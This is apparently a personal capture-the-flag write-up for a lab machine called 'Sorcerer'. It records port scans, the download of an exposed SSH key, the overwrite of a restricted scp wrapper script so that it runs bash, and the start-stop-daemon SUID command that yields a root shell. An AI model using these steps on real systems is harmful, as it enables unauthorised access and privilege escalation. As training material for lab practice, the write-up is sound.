---
Alias: Sorcerer
Date: {{date}}
Platform: Linux
Difficulty: Intermediate
Tags: #start-stop-daemon #start-stop-daemonSUIDPrivilegeEscalation
Status: Finished
IP: 192.168.143.100
---

# {{Sorcerer}}


# Resolution summary
- Ran Feroxbuster and found a "/zipfiles" directory on port 7742
- Located a ssh private key and username in the "/zipfiles" directory; additionally found a "scp_wrapper.sh" script
- Attempted to login via ssh with the found private ssh key but was unable to
- Changed "scp"
- 
- 

## Improved skills
- Modifying SCP_Wrapper.sh script to change to bash shell
- Learned to rewrite scp script in within target machine remotely

## Used tools
- nmap
- rustscan
- feroxbuster
- scp

---

# Information Gathering
Scanned all TCP ports:
```bash
rustscan -a 192.168.143.100 --ulimit 5000                                                                   (master✱) 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.143.100:22
Open 192.168.143.100:80
Open 192.168.143.100:111
Open 192.168.143.100:2049
Open 192.168.143.100:7742
Open 192.168.143.100:8080
Open 192.168.143.100:43329
Open 192.168.143.100:45519
Open 192.168.143.100:55683
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 00:45 EDT
Initiating Ping Scan at 00:45
Scanning 192.168.143.100 [2 ports]
Completed Ping Scan at 00:45, 3.01s elapsed (1 total hosts)
Nmap scan report for 192.168.143.100 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.10 seconds


nmap -sC -sV -p 22,80,111,2049,7742,8080,43329,45519,55683 192.168.143.100                                  (master✱) 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-20 01:17 EDT
Nmap scan report for 192.168.143.100
Host is up (0.080s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 81:2a:42:24:b5:90:a1:ce:9b:ac:e7:4e:1d:6d:b4:c6 (RSA)
|   256 d0:73:2a:05:52:7f:89:09:37:76:e3:56:c8:ab:20:99 (ECDSA)
|_  256 3a:2d:de:33:b0:1e:f2:35:0f:8d:c8:d7:8f:f9:e0:0e (ED25519)
80/tcp    open  http     nginx
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100003  3           2049/udp   nfs
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      45519/tcp   mountd
|   100005  1,2,3      50443/udp   mountd
|   100021  1,3,4      43329/tcp   nlockmgr
|   100021  1,3,4      50121/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/udp   nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
7742/tcp  open  http     nginx
|_http-title: SORCERER
8080/tcp  open  http     Apache Tomcat 7.0.4
|_http-title: Apache Tomcat/7.0.4
|_http-favicon: Apache Tomcat
43329/tcp open  nlockmgr 1-4 (RPC #100021)
45519/tcp open  mountd   1-3 (RPC #100005)
55683/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
```

Enumerated open TCP ports:
```bash
7742
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 7742 - HTTP nginx

#### -Ran feroxbuster and the below results showed "http://192.168.143.100:7742/zipfiles"

![](Pasted%20image%2020221109124628.png)

#### -Navigated to the webapge and found the following zip links

![](Pasted%20image%2020221109124738.png)

#### -Downloaded max.zip file and found the following "id_rsa" private ssh and "scp_wrapper.sh" script:

![](Pasted%20image%2020221109124849.png)

#### -Navigated to kali machine and typed copied the id_rsa file into a file named maxid_rsa and typed "chmod 600 maxid_rsa " to make the key private

#### -Typed "ssh -i maxid_rsa max@192.168.143.100" and received the following output:

![](Pasted%20image%2020221109125243.png)

---

# Exploitation
## Found ssh private key and rewrote scp_wrapper.sh script to run bash

#### -As found in Max zip file we found the "scp_wrapper.sh" was located in "/home/max"
#SCP_Wrapper.sh

#### -Copied the script in kali machine in vim file name "scp_wrapper.sh"

![](Pasted%20image%2020221109133314.png)

#### -Changed the "scp" code to "bash" and saved the file:

![](Pasted%20image%2020221109200105.png)

#### -Typed the following wich rewrites the "scp_wrapper.sh" script in /home/max location with the one I edited:

"scp -i maxid_rsa /home/kali/Downloads/ProvingGroundsBoxes/Sorcerer/scp_wrapper.sh  max@192.168.230.100:/home/max/scp_wrapper.sh"

![](Pasted%20image%2020221109133614.png)

#### -Typed  "ssh -i maxid_rsa max@192.168.230.100"  and logged into a ssh bash shell as max and typed "python -c 'import pty; pty.spawn("/bin/bash")'" to spawn a pty shell:

![](Pasted%20image%2020221109133953.png)

![](Pasted%20image%2020221109134032.png)

---

# Privilege Escalation
## Local Enumeration

#### -Ran linpeas.s script and found binary /usr/sbin/start-stop-daemon set as a SUID bit:

![](Pasted%20image%2020221109134636.png)

#start-stop-daemon #start-stop-daemonSUIDPrivilegeEscalation

#### -Checked GTFOBins website and found the following to run command "/usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p" for privilege escalation 

![](Pasted%20image%2020221109134944.png)

## Privilege Escalation vector
## /usr/sbin/start-stop-daemon SUID Privilege Escalation GTFOBINS

#### -Input the referenced command and received a root shell:

![](Pasted%20image%2020221109135035.png)
---

